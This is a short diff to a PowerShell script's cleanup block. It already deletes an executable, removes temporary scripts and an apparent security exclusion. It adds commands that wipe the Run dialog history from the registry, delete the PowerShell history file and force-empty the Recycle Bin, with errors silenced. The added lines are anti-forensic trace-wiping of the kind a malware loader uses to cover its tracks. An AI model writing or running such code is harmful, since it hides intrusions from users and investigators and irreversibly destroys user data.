@@ -74,6 +74,15 @@ finally {
     if (Test-Path $exePath) { Remove-Item -Path $exePath -Force }
     Remove-TempScripts
     Remove-Exclusion
+
+    # Delete Run box history
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+    # Delete PowerShell history
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+    # Empty Recycle Bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 Start-Sleep -Seconds 2
